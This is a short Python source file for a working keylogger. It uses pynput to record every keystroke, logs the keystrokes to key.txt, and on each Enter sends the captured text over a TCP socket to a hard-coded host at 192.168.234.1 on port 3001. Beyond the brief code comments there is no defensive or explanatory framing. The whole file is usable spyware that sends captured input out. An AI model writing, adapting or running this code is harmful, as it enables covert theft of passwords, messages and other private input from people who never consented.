import socket
from pynput.keyboard import Key,Listener

keyboard=Listener()
#To store the keys entered by user
data=""  
pressed_keys=set()

#ip 
Host='192.168.234.1'
port =3001

#connection is established at ipv4 and at TCP protocol
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((Host, port))

#the file is sent in a encoded way
fname='key.txt'
client.send(fname.encode())

#when key is pressed the below function would be executed
def on_press(key):
    with open("key.txt","a") as a:
       global data
       try:
           pressed_keys.add(key)
           # to check if the entered key is characters (a-z,A-Z,0-9)
           if hasattr(key,'char'):
              data+=key.char
           elif isinstance(key,Key):   # to check if it is any spl key like enter,space,ctrl,etc...
               if (key.name!="shift" and key.name!="space" and key.name!="ctrl_l" and key.name!="ctrl_r"):
                   data+=" "+key.name+" "
               if (key.name=="enter"):
                   #when enter is encountered the data would be sent to the server 
                   data+="\n"
                   a.write(data)
                   client.send(data.encode())
                   data=""
               elif (key.name=="shift"):
                   pass
               elif (key.name=="space"):
                   data+=" "
               elif (key.name=="ctrl_l" or key.name=="ctrl_r") and hasattr(key,'char'):
                   data+=key.name+" "+key.char+" "
       except Exception as e:
           print(f"Error: {e}")

#function to be executed when the key is released
def on_release(key):
    pressed_keys.discard(key)
        
with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
